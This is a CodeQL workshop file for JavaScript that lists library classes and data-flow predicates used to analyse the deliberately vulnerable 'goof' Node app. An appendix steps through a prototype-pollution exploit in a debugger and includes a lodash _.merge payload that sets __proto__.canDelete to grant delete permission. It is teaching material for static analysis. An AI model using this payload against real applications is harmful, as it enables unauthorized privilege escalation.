javascript/codeql-js-goof-workshop/workshop.org
** CodeQL JS library documentation 
   The following is an overview of available library documentation; the *bold*
   items are those used in this workshop.  
   - [[https://help.semmle.com/QL/learn-ql/javascript/introduce-libraries-js.html#codeql-library-for-javascript][codeql-library-for-javascript]]
     - [[https://help.semmle.com/QL/learn-ql/javascript/introduce-libraries-js.html#syntactic-level][Syntactic Level]]
       - ASTNode,
         - TopLevel
         - Stmt
         - *Expr*
           - *FunctionExpr*
           - InvokeExpr
             - CallExpr
             - NewExpr
             - *MethodCallExpr*
           - PropAccess

       - [[https://help.semmle.com/QL/learn-ql/javascript/introduce-libraries-js.html#functions][functions overview ]] and the [[https://help.semmle.com/qldoc/javascript/semmle/javascript/Functions.qll/type.Functions$Function.html][Function]] reference
         - FunctionDeclStmt (a subclass of Stmt)
         - *FunctionExpr* (a subclass of Expr)
         - ArrowFunctionExpr (also a subclass of Expr)
       - ClassDefinition,
         - ClassDeclStmt (which is a subclass of Stmt)
         - ClassExpr (which is a subclass of Expr)
       - MemberDefinition
         - MethodDefinition
         - FieldDefinition
       - DeclStmt
       - BindingPattern
         - VarRef
         - Parameter
         - ArrayPattern
         - ObjectPattern
       - Property: Properties in object literals.  Is also a subclass of ASTNode,
         but neither of Expr nor of Stmt.
       - Module
         - ES2015Module
         - NodeModule
         - AMDModule
       - Scope
         - GlobalScope
         - FunctionScope
         - CatchScope
       - Variable 
         - VarDecl
         - VarAccess
     - [[https://help.semmle.com/QL/learn-ql/javascript/introduce-libraries-js.html#control-flow][Control Flow Graph]]
       - ControlFlowNode
     - [[https://help.semmle.com/QL/learn-ql/javascript/introduce-libraries-js.html#data-flow][Data Flow]]
       - definition and use
         - VarDef
         - VarUse
       - ssa
       - [[https://help.semmle.com/QL/learn-ql/javascript/introduce-libraries-js.html#data-flow-nodes][data flow nodes]]
         - *DataFlow::Node*
           - ValueNode
             - /To =ValueNode=/: use =DataFlow::valueNode= to convert an
               expression, function or class into its corresponding ValueNode
             - /From =ValueNode=/: use =ValueNode.getAstNode()= for mapping from
               ValueNodes to ASTNodes

           - SsaDefinitionNode
             - /To =SsaDefinitionNode=/, use =DataFlow::ssaDefinitionNode= to map
               an SSA definition to its corresponding SsaDefinitionNode.
             - /To =SsaDefinitionNode= for a parameter:/ the auxiliary predicate
               =DataFlow::parameterNode= maps a parameter to its
               corresponding data flow node.
             - /From =SsaDefinitionNode=:/ use
               =SsaDefinitionNode.getSsaVariable()= to get the =SsaVariable=

         - Use =DataFlow::Node.getAPredecessor()= to find other data flow nodes
           from which values may flow into this node, and *=getASuccessor()=* for the
           other direction.

       - [[https://help.semmle.com/QL/learn-ql/javascript/introduce-libraries-js.html#type-inference][Type inference]]
       - [[https://help.semmle.com/QL/learn-ql/javascript/introduce-libraries-js.html#call-graph][Call Graph]]
       - inter-procedural
         - DataFlow::Configuration
         - TaintTracking::Configuration


** CodeQL JS data flow library documentation 
   Following are links and short descriptions of the dataflow concepts this
   workshop touches on.  Follow the links for a more in-depth description.

   - [[https://help.semmle.com/QL/learn-ql/javascript/dataflow.html#analyzing-data-flow-in-javascript-and-typescript][analyzing-data-flow-in-javascript-and-typescript]]
     - [[https://help.semmle.com/QL/learn-ql/javascript/dataflow.html#local-data-flow][*local data flow*]] Use the member predicates =getAPredecessor()= and
       =getASuccessor()= on DataFlow::Node.  To follow one or more steps of local
       data flow, use the transitive closure operator =+=, and for zero or more
       steps the reflexive transitive closure operator =*=.

     - [[https://help.semmle.com/QL/learn-ql/javascript/dataflow.html#global-data-flow][*global-data-flow*]] global data flow is less precise than local data
       flow. That is, the analysis may report spurious flows that cannot in fact
       happen. Moreover, global data flow analysis typically requires
       significantly more time and memory than local analysis.


* Appendices
** Appendix A: Trace the exploit in the VS Code JS Debugger
   To see the prototype injection exploit in action using the JS debugger, try the
   following steps:
   - set up shell
     #+BEGIN_SRC sh
       . ~/local/goof/exploits/prototype-pollution.sh
       # Gain permissions with c3
       # Delete message with c4
     #+END_SRC
   - Launch for debugging:
     #+BEGIN_SRC sh
       cd ~/local/goof
       echo $$ && node --inspect=$$ app.js
     #+END_SRC
   - In vs code, run 'attach to node process', choose the =node --inspect...=
     process.
   - Set breakpoints in files, ~/local/goof/routes/index.js line 272
   - From the shell, send the delete request.  It will fail to delete: 
     : c4
   - Run the gain permission exploit, this will trap at breakpoint:
     : c3
   - In vs code debug console, observe the value of
     : ({}).__proto__.canDelete
     before and after the
     : _.merge(message, req.body.message, {...})
     expression.

   Oddly, there is different behavior in node command line:
   #+BEGIN_SRC javascript
     // Different behavior in node command line?
     cd ~/local/goof
     node
     Welcome to Node.js v14.13.1.
     Type ".help" for more information.
     var _ = require('lodash');
     var a = {"name": "a"}
     var b = {"name": "b"}
     ({}).__proto__.canDelete        // undefined
     _.merge(a, { "text": "😈", "__proto__": {"canDelete": true}}, b)
     a.canDelete                     // true
     b.canDelete                     // undefined
     ({}).__proto__.canDelete        // undefined
   #+END_SRC
  
